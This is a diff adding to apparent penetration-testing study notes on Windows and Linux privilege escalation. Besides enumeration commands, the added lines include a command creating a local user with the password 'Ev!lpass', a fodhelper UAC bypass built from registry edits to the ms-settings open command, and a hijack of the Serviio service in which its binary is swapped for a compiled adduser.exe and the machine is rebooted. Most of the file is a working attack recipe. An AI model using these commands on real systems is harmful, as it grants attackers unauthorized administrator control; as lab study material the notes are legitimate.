@@ -28,6 +28,7 @@ REG QUERY HKCU\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 REG QUERY HKLM\Software\Policies\Microsoft\Windows\Installer
 
+windows-privesc-check2.exe --dump -G
 
 ```
 
@@ -36,6 +37,7 @@ REG QUERY HKLM\Software\Policies\Microsoft\Windows\Installer
 whoami
 id
 cat /etc/passwd
+hostname
 cat /etc/issue
 cat /etc/*-release
 uname -a
@@ -57,5 +59,63 @@ lsmod
 find / -writable -type d 2>/dev/null
 
 find / -perm -u=s -type f 2>/dev/null
+
+./unix-privesc-check standard > output.txt
+
+```
+
+
+
+```
+whoami /groups
+
+net user admin Ev!lpass
+powershell.exe Start-Process cmd.exe -Verb runAs - will require accepting UAC prompt
+
+
+
+```
+
+
+```
+cd C:\Tools\privilege_escalation\SysinternalsSuite 
+sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+
+```
+run fodhelper.exe
+in process monitor - search fodhelper.exe
+reg -> name not found -> HKCU 
+
+HKCU:\Software\Classes\ms-settings\shell\open\command
+HKCR:ms-settings\shell\open\command
+
+
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+
+
+Listing running services on Windows using PowerShell
+
+```
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+
+icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+
+i686-w64-mingw32-gcc adduser.c -o adduser.exe
+
+move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
+
+move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
+
+dir "C:\Program Files\Serviio\bin\"
+
+wmic service where caption="Serviio" get name, caption, state, startmode
+
+whoami /priv
+
+shutdown /r /t 0
+
+net localgroup administrators
 
 ```
